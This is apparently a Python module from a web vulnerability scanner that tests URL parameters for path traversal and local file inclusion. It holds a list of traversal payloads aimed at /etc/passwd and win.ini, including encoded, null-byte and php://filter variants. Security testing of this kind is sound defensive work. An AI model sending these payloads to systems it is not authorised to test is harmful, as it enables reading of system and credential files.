"""Path Traversal Scanner — directory traversal / LFI detection."""

import re
from typing import List
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

from .base import BaseScanner
from .findings import Finding
from ..core.ratelimit import get_limiter
from ..core.transport import ssl_verify


class TraversalScanner(BaseScanner):
    """Tests for path traversal / local file inclusion."""

    NAME = "traversal"

    PAYLOADS = [
        ("../../../etc/passwd", "root:", "Linux passwd file"),
        ("..\\..\\..\\windows\\win.ini", "[operating systems]", "Windows config"),
        ("/etc/passwd", "root:", "Absolute Linux path"),
        ("....//....//....//etc/passwd", "root:", "Double-encode bypass"),
        ("..%252f..%252f..%252fetc/passwd", "root:", "Double URL encode"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:", "Full URL encode"),
        ("../../../etc/passwd%00", "root:", "Null byte injection"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter wrapper"),
    ]

    def __init__(self, rps: float = 5.0):
        super().__init__()
        self.limiter = get_limiter(rps)

    def scan_url(self, url: str, params: dict = None) -> List[Finding]:
        """Test for path traversal."""
        try:
            import httpx
        except ImportError:
            return []

        findings = []
        parsed = urlparse(url)
        test_params = params or {k: v[0] for k, v in parse_qs(parsed.query).items()}

        if not test_params:
            test_params = {"file": "index.html", "path": "pages/", "page": "home",
                          "include": "header.php", "template": "default"}

        client = httpx.Client(follow_redirects=True, timeout=10, verify=ssl_verify())

        for param_name in test_params:
            for payload, indicator, desc in self.PAYLOADS:
                test_params_copy = dict(test_params)
                test_params_copy[param_name] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_params_copy)))

                self.limiter.wait(parsed.netloc)
                try:
                    resp = client.get(test_url)

                    if resp.status_code == 200 and indicator in resp.text:
                        findings.append(Finding(
                            vuln_type="Path Traversal / LFI",
                            title=f"Path traversal via parameter '{param_name}' — {desc}",
                            severity="HIGH",
                            url=url,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"File content detected: '{indicator}' in response",
                            description=f"Path traversal allows reading {desc}.",
                            remediation="Validate file paths against whitelist. Use chroot/jail. Block path traversal characters.",
                            cvss=7.5,
                            cwe="CWE-22",
                            tool=self.NAME,
                            verified=True,
                            confidence="HIGH",
                        ))
                        return findings

                except Exception:
                    continue

        return findings
